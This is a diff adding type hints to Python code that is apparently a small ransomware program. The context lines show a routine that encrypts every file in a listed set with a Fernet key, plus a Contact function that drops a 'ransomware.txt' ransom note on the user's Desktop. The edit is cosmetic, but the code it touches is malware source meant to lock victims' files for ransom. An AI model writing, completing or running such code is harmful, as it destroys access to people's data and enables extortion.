@@ -6,7 +6,7 @@ from pathlib import Path
 from cryptography.fernet import Fernet
 
 
-def Process_Files(Private: Fernet, mode: str):
+def Process_Files(Private: Fernet, mode: str) -> None:
     for _, files in List_Files().items():
         for file in files:
             temp_file = file + '.temp'
@@ -28,15 +28,15 @@ def Process_Files(Private: Fernet, mode: str):
                     os.remove(temp_file.name)
 
 
-def Encrypt(Private: Fernet):
+def Encrypt(Private: Fernet) -> None:
     Process_Files(Private, 'encrypt')
 
 
-def Decrypt(Private: Fernet):
+def Decrypt(Private: Fernet) -> None:
     Process_Files(Private, 'decrypt')
 
 
-def Contact():
+def Contact() -> None:
     home = Path.home()
     desktop = home / "Desktop" / 'ransomware.txt'
     with open('scripts/info.txt', 'r') as file:
